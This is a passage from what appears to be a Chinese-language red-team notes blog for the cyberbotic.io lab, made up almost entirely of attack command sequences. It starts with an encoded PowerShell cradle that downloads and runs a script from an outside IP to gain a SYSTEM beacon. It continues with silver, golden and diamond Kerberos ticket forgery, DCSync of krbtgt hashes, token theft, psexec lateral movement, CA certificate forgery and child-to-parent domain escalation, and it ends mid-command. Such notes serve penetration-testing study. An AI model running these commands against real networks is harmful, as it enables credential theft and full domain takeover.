sweet potato exploit to get system shell</span><br><span class="hljs-comment"># Encoded Powershell payload</span><br>powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-enc</span> SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAzADkAOgA4ADAALwBhACcAKQApAA==<br><span class="hljs-comment"># execute sweet potato to get reverse shell/beacon as system user</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SweetPotato\bin\Release\SweetPotato.exe <span class="hljs-literal">-p</span> C:\Windows\System32\WindowsPowerShell\v1.<span class="hljs-number">0</span>\powershell.exe <span class="hljs-literal">-a</span> <span class="hljs-string">&quot;-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAzADkAOgA4ADAALwBhACcAKQApAA==&quot;</span><br>beacon&gt; connect localhost <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="域名控制"><a href="#域名控制" class="headerlink" title="域名控制"></a>域名控制</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">### Silver Ticket (offline)</span><br><br><span class="hljs-comment"># 1. Dump the machine hash using mimikatz (Service from 0 - hash)</span><br>beacon&gt; mimikatz !sekurlsa::ekeys<br>beacon&gt; mimikatz !sekurlsa::logonpasswords<br><br><span class="hljs-comment"># 2. Generate the silver Ticket TGS offline using Rubeus (use /rc4 flag for NTLM hash)</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainSID</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io<br><br><span class="hljs-built_in">PS</span> C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn<span class="hljs-literal">-1</span>.dev.cyberbotic.io /aes256:c9e598cd2a9b08fe31936f2c1846a8365d85147f75b8000cbc90e3c9de50fcc7 /user:nlamb /domain:dev.cyberbotic.io /sid:S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523</span> /nowrap<br><br><span class="hljs-comment"># 3. Inject the ticket and Verify the access </span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[<span class="hljs-type">...</span>]MuaW8=<br>beacon&gt; steal_token <span class="hljs-number">5668</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\wkstn<span class="hljs-literal">-1</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br>beacon&gt; jump psexec64 wkstn<span class="hljs-literal">-1</span>.dev.cyberbotic.io smb<br><br><span class="hljs-comment"># 4. Obtain more Service Tickets and inject (/ptt) into the sacrificial process</span><br><span class="hljs-built_in">PS</span> C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:HOST/wkstn<span class="hljs-literal">-1</span>.dev.cyberbotic.io /aes256:c9e598cd2a9b08fe31936f2c1846a8365d85147f75b8000cbc90e3c9de50fcc7 /user:nlamb /domain:dev.cyberbotic.io /sid:S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523</span> /nowrap<br><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:&lt;TGS<span class="hljs-literal">-TICKET</span>&gt;<br><br>beacon&gt; run klist<br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br><br><span class="hljs-comment"># 5. Different Services required for different uses. (For more - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#silver-ticket)</span><br><br><span class="hljs-comment"># psexec |  CIFS </span><br><span class="hljs-comment"># winrm  |  HOST &amp; HTTP</span><br><span class="hljs-comment"># wmi    | HOST &amp; RPCSS</span><br><span class="hljs-comment"># dcsync (DCs only) | LDAP</span><br><br><span class="hljs-comment">#-------------------------------------------------------------------------------------</span><br><br><span class="hljs-comment">### Golden Ticket (offline)</span><br><br><span class="hljs-comment"># 1. Fetch the NTLM/AES hash of krbtgt account</span><br>beacon&gt; dcsync dev.cyberbotic.io DEV\krbtgt<br><br><span class="hljs-comment"># 2. Generate Golden ticket offline using Rubeus</span><br><span class="hljs-comment"># Find the domain SID</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainSid</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io<br><span class="hljs-comment"># Create Golden Ticket</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainSID</span> <span class="hljs-literal">-Domain</span> dev.cyberbotic.io<br><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<span class="hljs-number">51</span>d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523</span> /nowrap<br><br><span class="hljs-comment"># 3. Inject golden ticket and gain access</span><br><span class="hljs-comment"># 3-a. For MACHINE TGT : Use Machine TGT fetched to gain RCE on itself using S4U abuse (/self flag)</span><br><span class="hljs-comment"># NOTE: A machine account TGT ticket if injected will not work probably, So we have to  abuse S4U2SELF to obtain TGS and get access as Local Admin to that machine.</span><br><span class="hljs-comment"># Verify this by injecting the TGT insto a sacrificial process and try to access the files. Check S4U2Self Notes below.</span><br><span class="hljs-comment"># Generate TGS from TGT</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io /user:dc<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /nowrap /ticket:doIFuj[<span class="hljs-type">...</span>]lDLklP<br><span class="hljs-comment"># Inject TGS in a sacrificial process</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[<span class="hljs-type">...</span>]MuaW8=<br>beacon&gt; steal_token <span class="hljs-number">2664</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br><span class="hljs-comment"># 3-b. For DOMAIN USER TGT : Inject the ticket and access the service.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[<span class="hljs-type">...</span>]MuaW8=<br>beacon&gt; steal_token <span class="hljs-number">2664</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br><br><span class="hljs-comment"># --------------------------------------------------------------------------------------</span><br><span class="hljs-comment">### Diamond Ticket (online)</span><br><br><span class="hljs-comment"># 1. Fetch the SID of User/Machine for which we </span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">ConvertTo-SID</span> dev/nlamb<br><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">get-domaincomputer</span> <span class="hljs-literal">-identity</span> dc<span class="hljs-literal">-2</span> | <span class="hljs-built_in">select</span> samaccountname,primarygroupid,objectsid<br><br><span class="hljs-comment"># 2. Create Diamond ticket (512 - Enterprise Group ID, krbkey - Hash of KRBRGT account)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:<span class="hljs-number">1106</span> /groups:<span class="hljs-number">512</span> /krbkey:<span class="hljs-number">51</span>d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap<br><span class="hljs-comment"># /tgtdeleg : uses the Kerberos GSS-API to obtain a useable TGT for the current user without needing to know their password, NTLM/AES hash, or elevation on the host.</span><br><span class="hljs-comment"># /ticketuser : is the username of the user to impersonate.</span><br><span class="hljs-comment"># /ticketuserid : is the domain RID of that user.</span><br><span class="hljs-comment"># /groups : are the desired group RIDs (512 being Domain Admins).</span><br><span class="hljs-comment"># /krbkey : is the krbtgt AES256 hash.</span><br><br><span class="hljs-comment"># 3. Rubeus describe will now show that this is a TGT for the target user.</span><br><span class="hljs-built_in">PS</span> C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[<span class="hljs-type">...snip...</span>]MuSU8=<br><br><span class="hljs-comment"># 4. Inject Diamond ticket (TGT) and gain acess</span><br><span class="hljs-comment"># 3-a. For MACHINE TGT : Use Machine TGT fetched to gain RCE on itself using S4U abuse (/self flag)</span><br><span class="hljs-comment"># NOTE: A machine account TGT ticket if injected will not work probably, So we have to  abuse S4U2SELF to obtain TGS and get access as Local Admin to that machine.</span><br><span class="hljs-comment"># Verify this by injecting the TGT insto a sacrificial process and try to access the files. Check S4U2Self Notes below.</span><br><span class="hljs-comment"># Generate TGS from TGT</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io /user:dc<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /nowrap /ticket:doIFuj[<span class="hljs-type">...</span>]lDLklP<br><span class="hljs-comment"># Inject TGS in a sacrificial process</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[<span class="hljs-type">...</span>]MuaW8=<br>beacon&gt; steal_token <span class="hljs-number">2664</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br><span class="hljs-comment"># 3-b. For DOMAIN USER TGT : Inject the ticket and access the service.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[<span class="hljs-type">...</span>]MuaW8=<br>beacon&gt; steal_token <span class="hljs-number">2664</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br><br><span class="hljs-comment"># ----------------------------------------------------------------------------------</span><br><span class="hljs-comment">### DPERSIST-1 : Forged certificates (DC or CA Server)</span><br><br><span class="hljs-comment"># 0. Finding Certificate Authorities</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Certify\Certify\bin\Release\Certify.exe cas<br><br><span class="hljs-comment"># 1. Dump the Private Key and Certificate of CA (run command in DC/CA)</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine<br><br><span class="hljs-comment"># 2. Save the certificate in .pem file and convert into pfx format using openssl</span><br>ubuntu@DESKTOP<span class="hljs-literal">-3BSK7NO</span> ~&gt; openssl pkcs12 <span class="hljs-operator">-in</span> cert.pem <span class="hljs-literal">-keyex</span> <span class="hljs-literal">-CSP</span> <span class="hljs-string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> <span class="hljs-literal">-export</span> <span class="hljs-literal">-out</span> cert.pfx<br><br><span class="hljs-comment"># 3. Next, use the stolen CA cert to generate fake cert for Domain user/Machine</span><br><span class="hljs-built_in">PS</span> C:\Users\Attacker&gt; C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe <span class="hljs-literal">--CaCertPath</span> .\Desktop\sub<span class="hljs-literal">-ca</span>.pfx <span class="hljs-literal">--CaCertPassword</span> pass123 <span class="hljs-literal">--Subject</span> <span class="hljs-string">&quot;CN=User&quot;</span> <span class="hljs-literal">--SubjectAltName</span> <span class="hljs-string">&quot;nlamb@cyberbotic.io&quot;</span> <span class="hljs-literal">--NewCertPath</span> .\Desktop\fake.pfx <span class="hljs-literal">--NewCertPassword</span> pass1231<br><br><span class="hljs-comment"># 4. Encode the certificate</span><br>ubuntu@DESKTOP<span class="hljs-literal">-3BSK7NO</span> ~&gt; <span class="hljs-built_in">cat</span> cert.pfx | base64 <span class="hljs-literal">-w</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 5. Use the certificate to get TGT for Domain User/Machine or Domain Admin</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /password:pass123 /nowrap /certificate:MIACAQ[<span class="hljs-type">...snip...</span>]IEAAAA<br><br><span class="hljs-comment"># 6. Inject the ticket (TGT) and access the service</span><br><span class="hljs-comment"># 6-A. For MACHINE TGT : Use Machine TGT fetched to gain RCE on itself using S4U abuse (/self flag)</span><br><span class="hljs-comment"># NOTE: A machine account TGT ticket if injected will not work probably, So we have to  abuse S4U2SELF to obtain TGS and get access as Local Admin to that machine.</span><br><span class="hljs-comment"># Verify this by injecting the TGT insto a sacrificial process and try to access the files. Check S4U2Self Notes below.</span><br><span class="hljs-comment"># Generate TGS from TGT</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io /user:dc<span class="hljs-literal">-2</span><span class="hljs-variable">$</span> /nowrap /ticket:doIFuj[<span class="hljs-type">...</span>]lDLklP<br><span class="hljs-comment"># Inject TGS in a sacrificial process</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[<span class="hljs-type">...</span>]MuaW8=<br>beacon&gt; steal_token <span class="hljs-number">2664</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br><span class="hljs-comment"># 6-B. For DOMAIN USER TGT : Inject the ticket and access the service.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[<span class="hljs-type">...</span>]MuaW8=<br>beacon&gt; steal_token <span class="hljs-number">2664</span><br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>

<h3 id="森林和域信任"><a href="#森林和域信任" class="headerlink" title="森林和域信任"></a>森林和域信任</h3><ul>
<li><p>跨域攻击</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## PrivEsc : Child (DEV.CYBERBOTIC.IO) to Parent (CYBERBOTIC.IO) within Same Domain via SID History using KrbTGT Hash of Child Domain. (Also possible using Trust Tickets)</span><br>  <br><span class="hljs-comment"># 1. Get the KrbTGT hash, From DC by running Mimikatz or using DCSync Attack.</span><br>beacon&gt; mimikatz !lsadump::dcsync /user:dev\krbtgt<br>beacon&gt; dcsync dev.cyberbotic.io dev\krbtgt<br>  <br><span class="hljs-comment"># 2. Enumerate the Domain Trusts (Use -Domain attribute to enumerate other domains)</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainTrust</span><br>  <br><span class="hljs-comment"># 3. Enumerate basic info required for creating forged ticket</span><br><span class="hljs-comment"># Find the SID of Domain Admin / Enterprise Admin group of parent domain</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroup</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-literal">-Domain</span> cyberbotic.io <span class="hljs-literal">-Properties</span> ObjectSid<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainSID</span> <span class="hljs-literal">-Domain</span> <span class="hljs-string">&quot;dev.cyberbotic.io&quot;</span><br><span class="hljs-comment"># Domain controller of parent domain</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainController</span> <span class="hljs-literal">-Domain</span> cyberbotic.io | <span class="hljs-built_in">select</span> Name<br><span class="hljs-comment"># Domain Admin of parent domain</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> <span class="hljs-literal">-Domain</span> cyberbotic.io | <span class="hljs-built_in">select</span> MemberName<br>  <br><span class="hljs-comment"># 4-a. Use Golden Ticket technique (/sid - SID of the current domain &amp; /sids - SID of Enterprise Admins or Parent Domain Admins &amp; /aes256 - Krbtgt Hash)</span><br><span class="hljs-built_in">PS</span> C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<span class="hljs-number">51</span>d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523</span> /sids:S<span class="hljs-literal">-1-5-21-2594061375-675613155-814674916-512</span> /nowrap<br>  <br><span class="hljs-comment"># 4-b. Or, Use Diamond Ticket technique</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:<span class="hljs-number">500</span> /groups:<span class="hljs-number">519</span> /sids:S<span class="hljs-literal">-1-5-21-2594061375-675613155-814674916-519</span> /krbkey:<span class="hljs-number">51</span>d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap<br>  <br><span class="hljs-comment"># 5. Inject the ticket</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[<span class="hljs-type">...snip...</span>]MuaW8=<br>  <br>beacon&gt; steal_token <span class="hljs-number">5060</span><br>beacon&gt; run klist<br>beacon&gt; <span class="hljs-built_in">ls</span> \\dc<span class="hljs-literal">-1</span>.cyberbotic.io\c<span class="hljs-variable">$</span><br>beacon&gt; jump psexec64 dc<span class="hljs-literal">-1</span>.cyberbotic.io smb<br>beacon&gt; dcsync cyberbotic.io cyber\krbtgt<br>beacon&gt; mimikatz !lsadump::dcsync /all /domain:cyberbotic.io<br></code></pre></td></tr></table></figure>
</li>
<li><p>跨林攻击（入站 &#x2F; 出站）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## Exploiting Inbound Trusts (Users in our domain can access resources in foreign domain) </span><br><span class="hljs-comment"># 1. We can enumerate the foreign domain with inbound trust</span><br>beacon&gt; powershell<span class="hljs-literal">-import</span> c:\Tools\PowerSploit\Recon\PowerView.ps1<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainTrust</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Domain</span> dev<span class="hljs-literal">-studio</span>.com <span class="hljs-literal">-Properties</span> DnsHostName<br>  <br><span class="hljs-comment"># 2. Check if members in current domain are part of any group in foreign domain</span><br><span class="hljs-comment"># Enumerate any groups that contain users outside of its domain</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainForeignGroupMember</span> <span class="hljs-literal">-Domain</span> dev<span class="hljs-literal">-studio</span>.com<br>beacon&gt; powerpick <span class="hljs-built_in">Find-ForeignGroup</span> <span class="hljs-literal">-Domain</span> dev<span class="hljs-literal">-studio</span>.com<br>beacon&gt; powerpick <span class="hljs-built_in">Find-ForeignUser</span> <span class="hljs-literal">-Domain</span> dev<span class="hljs-literal">-studio</span>.com<br>  <br><span class="hljs-comment"># Verify the username from SID returned in previous step</span><br>beacon&gt; powerpick <span class="hljs-built_in">ConvertFrom-SID</span> S<span class="hljs-literal">-1-5-21-569305411-121244042-2357301523-1120</span><br>  <br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainGroupMember</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Studio Admins&quot;</span> | <span class="hljs-built_in">select</span> MemberName<br>beacon&gt; powerpick <span class="hljs-built_in">Get-DomainController</span> <span class="hljs-literal">-Domain</span> dev<span class="hljs-literal">-studio</span>.com | <span class="hljs-built_in">select</span> Name<br>  <br><span class="hljs-comment"># 3. Fetch the AES256 hash of Domain user , who have the access or part of the group in foreign domain.</span><br>beacon&gt; dcsync dev.cyberbotic.io dev\nlamb<br>beacon&gt; mimikatz !lsadump::dcsync dev\nlamb /domain:dev.cyberbotic.io<br><span class="hljs-comment"># 4. We can create Inter-Realm TGT for user identified in above steps (/aes256 has users hash)</span><br><span class="hljs-comment"># Getting TGT using hash</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap<br><span class="hljs-comment"># Getting Inter-Realm TGT for target domain from current domain TGT.</span><br>beacon&gt; execute<span class="hljs-literal">-assembly</span> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev<span class="hljs-literal">-studio</span>.com /domain:dev.cyberbotic.io /dc:dc<span class="hljs-literal">-2</span>.dev.cyberbotic.io /nowrap /ticket:doIFwj[<span 